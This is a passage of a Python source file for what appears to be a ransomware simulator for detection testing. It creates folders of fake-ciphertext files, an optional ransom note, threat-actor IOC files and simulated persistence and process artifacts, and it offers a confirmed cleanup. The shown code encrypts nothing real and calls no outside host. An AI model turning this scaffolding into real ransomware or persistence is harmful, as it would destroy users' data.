            print(f"6) Create persistence artifacts for {os_icon} {os_name} (after running simulation)")
            print("7) View persistence report")

            print("\nStep 4 - Process Simulation:")
            print(f"9) Create process artifacts for {os_icon} {os_name}")
            print("10) View process simulation report")
            
            print("\nExecution:")
            print("8) RUN simulation (creates selected artifacts)")
            print("   - Creates simulation directory")
            print("   - Generates encrypted files")
            print("   - Plants selected IOCs")
            print("   - Generates detailed report")
            
            print("\nCleanup:")
            if self.last_output_dir:
                print("11) Clean up last simulation folder")
                print("12) Exit")
            else:
                print("11) Exit")
            choice = input("Select an option: ").strip()

            if choice == "1":
                self.choose_extension()
            elif choice == "2":
                self.set_file_count()
            elif choice == "3":
                self.write_note = not self.write_note
                print(f"Ransom note now {'ON' if self.write_note else 'OFF'}")
            elif choice == "4":
                # Initialize IOC simulator with a temporary directory if needed
                if not self.ioc_simulator:
                    temp_dir = get_desktop() / "temp_ioc_sim"
                    self.ioc_simulator = IOCSimulator(temp_dir)
                self.ioc_simulator.select_profile()
            elif choice == "5":
                if not self.ioc_simulator or not self.ioc_simulator.selected_profile:
                    print("Select a threat actor profile first (option 4).")
                    continue
                # Preview the report without requiring a directory
                profile = THREAT_PROFILES[self.ioc_simulator.selected_profile]
                print(f"\nPreviewing IOCs for {profile['name']}:")
                print(f"Description: {profile['description']}")
                print("\nFile Patterns:")
                for pattern in profile['file_patterns']:
                    print(f"  - {pattern}")
                print("\nNetwork IOCs:")
                for ioc in profile['network_iocs']:
                    print(f"  - {ioc}")
                print("\nRegistry Keys:")
                for key in profile['registry_keys']:
                    print(f"  - {key}")
                print("\nMutexes:")
                for mutex in profile['mutexes']:
                    print(f"  - {mutex}")
                print("\nNote: Run simulation (option 6) to create these artifacts.")
                input("\nPress Enter to continue...")
            elif choice == "6":
                if not self.last_output_dir:
                    print("Run a simulation first to create a target directory.")
                    continue
                if not self.persistence_simulator:
                    self.persistence_simulator = PersistenceSimulator(self.last_output_dir, self.system_info)
                artifacts = self.persistence_simulator.simulate_persistence()
                if artifacts:
                    print("\nCreated persistence artifacts:")
                    for artifact_type, path in artifacts:
                        print(f"  - {artifact_type}: {path}")
                else:
                    print(f"\nNo persistence artifacts created for {self.system_info['type']} OS.")
                input("\nPress Enter to continue...")
            elif choice == "7":
                if not self.persistence_simulator or not self.persistence_simulator.created_artifacts:
                    print("Create persistence artifacts first (option 6).")
                    continue
                report = self.persistence_simulator.generate_persistence_report()
                print("\n" + report)
                input("\nPress Enter to continue...")
            elif choice == "8":
                self.run_sim()
            elif choice == "9":
                if not self.last_output_dir:
                    print("Run a simulation first to create a target directory.")
                    continue
                if not self.process_simulator:
                    self.process_simulator = ProcessSimulator(self.last_output_dir, self.system_info)
                artifacts = self.process_simulator.create_process_artifacts()
                if artifacts:
                    print("\nCreated process simulation artifacts:")
                    for artifact_type, path in artifacts:
                        print(f"  - {artifact_type}: {path}")
                    print("\nNOTE: These are benign script files that SIMULATE malicious process patterns.")
                    print("      They can be used to test detection capabilities.")
                    print("      Review process_simulation.txt for full details.")
                else:
                    print(f"\nNo process artifacts created for {self.system_info['type']} OS.")
                input("\nPress Enter to continue...")
            elif choice == "10":
                if not self.process_simulator or not self.process_simulator.created_artifacts:
                    print("Create process artifacts first (option 9).")
                    continue
                report = self.process_simulator.generate_process_report()
                print("\n" + report)
                input("\nPress Enter to continue...")
            elif choice == "11" and self.last_output_dir:
                self.cleanup_last()
            elif (choice == "11" and not self.last_output_dir) or (choice == "12" and self.last_output_dir):
                print("Bye.")
                return
            else:
                print("Invalid choice.")

    def choose_extension(self):
        print("\nAvailable extensions:")
        for i, ext in enumerate(EXTENSIONS, start=1):
            print(f"{i:2d}) {ext}")
        print(f"{len(EXTENSIONS)+1:2d}) Kitchen Sink (one file of each)")
        sel = input("Pick a number: ").strip()
        try:
            n = int(sel)
            if 1 <= n <= len(EXTENSIONS):
                self.ext_choice = EXTENSIONS[n-1]
                print(f"Selected extension: {self.ext_choice}")
            elif n == len(EXTENSIONS)+1:
                self.ext_choice = "KITCHEN_SINK"
                print("Selected: Kitchen Sink")
            else:
                print("Out of range.")
        except ValueError:
            print("Please enter a number.")

    def set_file_count(self):
        val = input("How many files to create? (1-5000, default 50): ").strip()
        if not val:
            print("File count unchanged.")
            return
        try:
            n = int(val)
            if 1 <= n <= 5000:
                self.file_count = n
                print(f"File count set to {self.file_count}")
            else:
                print("Please choose between 1 and 5000.")
        except ValueError:
            print("Please enter a valid integer.")

    def run_sim(self):
        if not self.ext_choice:
            print("Pick an extension first (option 1).")
            return

        base = get_desktop()
        ts = datetime.now().strftime("%Y%m%d-%H%M%S")
        outdir = base / f"RansomSim-{ts}"
        outdir.mkdir(parents=True, exist_ok=True)

        created = 0
        if self.ext_choice == "KITCHEN_SINK":
            # One file per extension
            for ext in EXTENSIONS:
                fname = f"{random_filename()}{ext}"
                path = outdir / fname
                with open(path, "w", encoding="utf-8") as f:
                    f.write(f"--- Simulation file (fake encrypted) ---\n")
                    f.write(f"Extension: {ext}\nTimestamp: {ts}\n\n")
                    f.write(fake_ciphertext())
                created += 1
        else:
            # Multiple files with the selected extension
            for _ in range(self.file_count):
                fname = f"{random_filename()}{self.ext_choice}"
                path = outdir / fname
                with open(path, "w", encoding="utf-8") as f:
                    f.write(f"--- Simulation file (fake encrypted) ---\n")
                    f.write(f"Extension: {self.ext_choice}\nTimestamp: {ts}\n\n")
                    f.write(fake_ciphertext())
                created += 1

        if self.write_note:
            note_path = outdir / "READ_ME_NOW.txt"
            with open(note_path, "w", encoding="utf-8") as f:
                f.write(make_note_text(str(outdir), self.ext_choice, created))

        # Create IOCs if a profile is selected
        ioc_files = []
        if self.ioc_simulator and self.ioc_simulator.selected_profile:
            self.ioc_simulator.base_dir = outdir
            ioc_files = self.ioc_simulator.create_file_iocs()
            report_path = outdir / "IOC_REPORT.txt"
            with open(report_path, "w", encoding="utf-8") as f:
                f.write(self.ioc_simulator.generate_ioc_report())

        self.last_output_dir = outdir
        print(f"\nSimulation complete.")
        print(f"Folder: {outdir}")
        print(f"Encrypted files: {created}")
        print(f"IOC files: {len(ioc_files) if ioc_files else 0}")
        print(f"Ransom note: {'YES' if self.write_note else 'NO'}")
        if ioc_files:
            print("IOC report generated: IOC_REPORT.txt")

    def cleanup_last(self):
        if not self.last_output_dir or not self.last_output_dir.exists():
            print("No existing simulation folder found.")
            self.last_output_dir = None
            return
        confirm = input(f"Delete folder {self.last_output_dir}? (y/N): ").strip().lower()
        if confirm == "y":
            # Safe recursive delete of our own folder
            for root, dirs, files in os.walk(self.last_output_dir, topdown=False):
                for name in files:
                    try:
                        os.remove(Path(root) / name)
                    except Exception as e:
                        print(f"Error removing file {name}: {e}")
                for name in dirs:
                    try:
                        os.rmdir(Path(root) / name)
                    except Exception as e:
                        print(f"Error removing dir {name}: {e}")
            try:
                os.rmdir(self.last_output_dir)
                print("Deleted.")
            except Exception as e:
                print(f"Error removing base folder: {e}")
            self.last_output_dir = None
        else:
            print("Cleanup canceled.")

if __name__ == "__main__":
    random.seed(time.time_ns())
    sim = Simulator()
    try:
        sim.menu()
    except KeyboardInterrupt:
        print("\nInterrupted. Bye.")
        sys.exit(0)

